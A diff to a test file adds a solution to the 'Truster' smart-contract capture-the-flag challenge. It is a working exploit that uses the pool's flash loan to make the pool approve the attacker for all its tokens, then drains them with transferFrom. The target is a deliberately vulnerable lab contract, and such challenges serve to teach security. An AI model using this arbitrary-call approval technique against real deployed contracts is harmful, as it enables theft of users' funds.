@@ -29,6 +29,14 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        pool = this.pool.connect(attacker);
+        token = this.token.connect(attacker);
+        calldata = this.token.interface.encodeFunctionData("approve", [
+            attacker.address,
+            TOKENS_IN_POOL,
+          ])
+        await pool.flashLoan(0, attacker.address, token.address, calldata);
+        await token.transferFrom(pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
